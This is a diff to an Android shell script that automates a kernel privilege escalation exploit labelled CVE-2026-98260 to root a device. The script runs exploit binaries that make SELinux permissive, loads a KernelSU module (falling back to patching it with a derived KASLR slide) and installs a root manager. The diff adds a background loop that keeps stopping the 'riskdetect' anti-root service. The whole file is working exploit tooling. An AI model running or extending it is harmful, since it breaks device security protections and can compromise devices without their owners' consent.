@@ -2,12 +2,14 @@
 # PYB110 one-key flow, CVE-2026-98260 branch (t98260_plant + t98260_su).
 D=${PYB110_DIR:-/data/local/tmp/pyb110}
 cd "$D" || exit 1
-chmod 755 t98260_plant t98260_su prep_solve prep_patch forker ksu* ksud* 2>/dev/null
+chmod 755 t98260_plant t98260_su prep_patch ksu* ksud* 2>/dev/null
 
 MANAGER=${PYB110_MANAGER:-kernelsu}
 DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
+LATE_OK=0
 UNLOAD_GUARD=${PYB110_UNLOAD_GUARD:-0}
 case "$MANAGER" in
+  finasu) BASE=ksu-base-finasu.ko; KSUD=ksud_finasu; MPKG=me.yuki.fina ;;
   next) BASE=ksu-base-next.ko; KSUD=ksud_next; MPKG=com.rifsxd.ksunext ;;
   bakasu) BASE=ksu-base-bakasu.ko; KSUD=ksud_bakasu; MPKG=com.resukisu.resukisu ;;
   sukisu) BASE=ksu-base-sukisu.ko; KSUD=ksud_sukisu; MPKG=com.sukisu.ultra ;;
@@ -15,6 +17,42 @@ case "$MANAGER" in
 esac
 MPKG=${PYB110_MANAGER_PKG:-$MPKG}
 echo "EXPLOIT=98260 ENGINE=t98260 MANAGER=$MANAGER"
+
+restore_screenshot_stack() {
+  echo "SCREENSHOT_STACK: checking ColorOS screenshot components"
+  if ! su -c true >/dev/null 2>&1; then
+    echo "SCREENSHOT_STACK_SKIP=no-su"
+    return 0
+  fi
+  DIS=$(su -c "pm list packages -d --user 0 2>/dev/null" 2>/dev/null | tr -d '\r')
+  for p in com.oplus.exsystemservice com.oplus.screenshot; do
+    if ! su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p"; then
+      echo "SCREENSHOT_STACK_ABSENT=$p"
+      continue
+    fi
+    if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
+      su -c "pm enable --user 0 '$p'" 2>&1
+      echo "SCREENSHOT_STACK_ENABLED=$p rc=$?"
+    else
+      echo "SCREENSHOT_STACK_OK=$p"
+    fi
+  done
+}
+
+crown_dynamic_manager() {
+  if [ "$MANAGER" != "finasu" ]; then
+    return 0
+  fi
+  APKP=$(pm path me.yuki.fina 2>/dev/null | sed -n 's/^package://p' | head -n 1)
+  if [ -z "$APKP" ]; then
+    echo "DYNAMIC_MANAGER_NO_APK"
+    return 0
+  fi
+  su -c "/data/adb/ksud dynamic set-apk '$APKP'" 2>&1
+  echo "DYNAMIC_SET_APK_RC=$?"
+  su -c "/data/adb/ksud dynamic list" 2>&1
+  echo "DYNAMIC_LIST_RC=$?"
+}
 
 unload_guard() {
   if [ "$UNLOAD_GUARD" = "1" ]; then
@@ -73,44 +111,99 @@ load_susfs() {
   fi
 }
 
+start_antiroot_guard() {
+  if [ "$DISABLE_ANTIROOT" != "1" ]; then
+    echo "ANTIROOT_SKIP: switch off; riskdetect not stopped"
+    return 0
+  fi
+  setsid sh -c "
+    n=0
+    while [ \$n -lt 100 ]; do
+      su -c 'stop riskdetect' >/dev/null 2>&1 && break
+      sleep 0.1
+      n=\$((n+1))
+    done
+    st=\$(su -c 'getprop init.svc.riskdetect' 2>/dev/null | tr -d '\r')
+    echo \"ANTIROOT_STOPPED state=\$st\" >> '$D/antiroot.log'
+  " >/dev/null 2>&1 &
+  echo "ANTIROOT_GUARD_BG: stop riskdetect HAL requested (no restore; restored on reboot)"
+}
+
+wait_kernelsu() {
+  n=0
+  while [ $n -lt 50 ]; do
+    grep -qi kernelsu /proc/modules 2>/dev/null && return 0
+    sleep 0.1
+    n=$((n+1))
+  done
+  return 1
+}
+
+wait_su() {
+  n=0
+  while [ $n -lt 50 ]; do
+    if [ -x /system/bin/su ] && su -c true >/dev/null 2>&1; then return 0; fi
+    sleep 0.1
+    n=$((n+1))
+  done
+  return 1
+}
+
 finish_manager() {
   cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
   unload_guard
   su -c "/data/local/tmp/ksud_official install" 2>&1
   echo "KSUD_INSTALL_RC=$?"
   install_manager_apk
-  if [ "$DISABLE_ANTIROOT" = "1" ]; then
-    su -c "pm disable-user --user 0 com.oplus.exsystemservice" 2>&1
-    echo "DISABLE_RC=$?"
-    su -c "pkill -9 -f com.oplus.exsystemservice" 2>&1
-    echo "KILL_RC=$?"
-    sleep 5
-    su -c "pm enable com.oplus.exsystemservice" 2>&1
-    echo "ANTIROOT_RESTORED: 已恢复 exsystemservice；如截图等系统功能异常，请软重启（重启 zygote/SystemUI）"
-  else
-    echo "ANTIROOT_SKIP: 开关关闭，未禁用安全组件"
-  fi
+  crown_dynamic_manager
+  restore_screenshot_stack
   su -c "id; getenforce; grep -i kernelsu /proc/modules" 2>&1
   echo "SU_ID_RC=$?"
   if [ "$(su -c 'id -u' 2>/dev/null | tr -d '\r')" = "0" ]; then
     su -c "pkill -9 t98260_plant 2>/dev/null; rm -f /data/local/tmp/t98260-root.sock" 2>&1
     echo "ROOTD_CLEANED"
   else
-    echo "ROOTD_KEPT: su 不可用，保留 rootd 兜底"
+    echo "ROOTD_KEPT: su unavailable; keeping rootd as fallback"
   fi
   load_susfs
+  # ksud late-load already restarts the manager; a second force-stop/start
+  # would flash its splash twice.
+  if [ "$LATE_OK" = "1" ]; then
+    n=0
+    while [ $n -lt 15 ]; do
+      pidof "$MPKG" >/dev/null 2>&1 && break
+      sleep 0.1
+      n=$((n+1))
+    done
+    if pidof "$MPKG" >/dev/null 2>&1; then
+      echo "MANAGER_START=late-load"
+      return 0
+    fi
+  fi
   am force-stop "$MPKG" 2>/dev/null
-  monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
+  ACT=$(cmd package resolve-activity --brief -a android.intent.action.MAIN -c android.intent.category.LAUNCHER "$MPKG" 2>/dev/null | tail -n 1)
+  case "$ACT" in
+    */*)
+      am start -n "$ACT" 2>&1
+      echo "MANAGER_START=$ACT"
+      ;;
+    *)
+      echo "MANAGER_START_FALLBACK=monkey"
+      monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 2>&1
+      ;;
+  esac
 }
 
 if grep -qi kernelsu /proc/modules 2>/dev/null; then
   echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
+  start_antiroot_guard
+  wait_su || echo "SU_WAIT_TIMEOUT"
   finish_manager
   echo DONE
   exit 0
 fi
 
-echo "[1/5] probe"
+echo "[1/4] probe"
 ./t98260_plant --probe > probe.log 2>&1
 rc=$?
 cat probe.log
@@ -119,84 +212,71 @@ if [ $rc -ne 0 ]; then
   exit 11
 fi
 
-echo "[2/5] capture + solve slide"
-R=/sys/kernel/tracing/events/kmem/rss_stat
-echo 1 > "$R/enable" 2>/dev/null
-printf 'disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf 'disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf 'disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-SLIDE=""
-for t in 1 2 3; do
-  echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
-  : > /sys/kernel/tracing/trace 2>/dev/null
-  sh take_slide.sh
-  if ./prep_solve . syms.txt; then
-    SLIDE=$(cat slide.txt)
-    break
-  fi
-  echo "SLIDE_RETRY=$t"
-done
-printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-if [ -z "$SLIDE" ]; then
-  echo "SOLVE_FAIL"
+echo "[2/4] run t98260_plant (auto slide)"
+if pidof t98260_plant >/dev/null 2>&1; then
+  echo "STALE_PLANT: $(pidof t98260_plant); reboot before rerunning 98260 (avoid freeing the page-holding process)"
   exit 12
 fi
-echo "SLIDE=$SLIDE"
-
-echo "[3/5] run t98260_plant"
-kill -9 $(pidof t98260_plant) 2>/dev/null
 rm -f plant.log t98260-root.sock
-R=/sys/kernel/tracing/events/kmem/rss_stat
-echo 1 > "$R/enable" 2>/dev/null
-printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
-printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
-setsid ./t98260_plant --slide "$SLIDE" --budget 240 > plant.log 2>&1 &
-BP=$!
-echo "PLANT_PID=$BP (命中后 SELinux 变 Permissive，约 10-120 秒)"
+setsid sh -c "./t98260_plant --auto --budget 240 2>&1 | tee plant.log" &
+sleep 0.1
+echo "PLANT_PID=$(pidof t98260_plant) (SELinux becomes Permissive after a hit)"
 ROOTED=0
 i=0
-while [ $i -lt 110 ]; do
+while [ $i -lt 1100 ]; do
   if grep -q "ROOTD_READY" plant.log 2>/dev/null; then ROOTED=1; break; fi
   if grep -qE "FAIL=(task|selinux|cred|init|probe)" plant.log 2>/dev/null; then break; fi
   if grep -q "PARKED=1" plant.log 2>/dev/null; then break; fi
-  kill -0 $BP 2>/dev/null || break
-  if [ $((i % 5)) -eq 0 ]; then
-    tail -n 2 plant.log 2>/dev/null | sed 's/^/  | /'
+  if ! pidof t98260_plant >/dev/null 2>&1; then
+    grep -q "ROOTD_READY" plant.log 2>/dev/null && ROOTED=1
+    break
   fi
-  sleep 3
+  sleep 0.3
   i=$((i+1))
 done
-if [ "$ROOTED" != "1" ] || [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
+if [ "$ROOTED" != "1" ] && grep -q "ROOTD_READY" plant.log 2>/dev/null; then
+  ROOTED=1
+fi
+if [ "$ROOTED" != "1" ]; then
   echo "PLANT_FAIL (enforce=$(getenforce 2>/dev/null))"
+  tail -n 15 plant.log 2>/dev/null
+  exit 13
+fi
+if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
+  echo "PLANT_FAIL_ENFORCE: $(getenforce 2>/dev/null)"
   tail -n 15 plant.log 2>/dev/null
   exit 13
 fi
 echo "PLANT_OK: enforce=Permissive, rootd ready"
 
-echo "[4/5] handoff to $MANAGER"
+echo "[3/4] handoff to $MANAGER"
+start_antiroot_guard
 ./t98260_su -c "$D/$KSUD late-load --kmi android17-6.18 --allow-shell --package-name $MPKG" 2>&1
-sleep 2
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+wait_kernelsu && LATE_OK=1
+if [ "$LATE_OK" != "1" ]; then
   echo "LATE_LOAD_RETRY: without --kmi"
   ./t98260_su -c "$D/$KSUD late-load --allow-shell --package-name $MPKG" 2>&1
-  sleep 2
+  wait_kernelsu && LATE_OK=1
 fi
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+if [ "$LATE_OK" != "1" ]; then
   echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
+  SLIDE=$(sed -n 's/.*SLIDE_DERIVED=0x\([0-9a-f]*\).*/0x\1/p' plant.log 2>/dev/null | tail -n 1)
+  if [ -z "$SLIDE" ]; then
+    echo "PATCH_FAIL: no slide"
+    exit 14
+  fi
+  echo "SLIDE=$SLIDE"
   ./prep_patch "$BASE" syms.txt "$SLIDE" ksu-98260.ko || { echo "PATCH_FAIL"; exit 14; }
   ./t98260_su -c "insmod $D/ksu-98260.ko" 2>&1
   echo "INSMOD_RC=$?"
-  sleep 2
 fi
-if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
+if ! wait_kernelsu; then
   echo "LOAD_FAIL"
   exit 15
 fi
 echo "MODULE_LOADED"
+wait_su || echo "SU_WAIT_TIMEOUT"
 
-echo "[5/5] manager setup"
+echo "[4/4] manager setup"
 finish_manager
 echo DONE
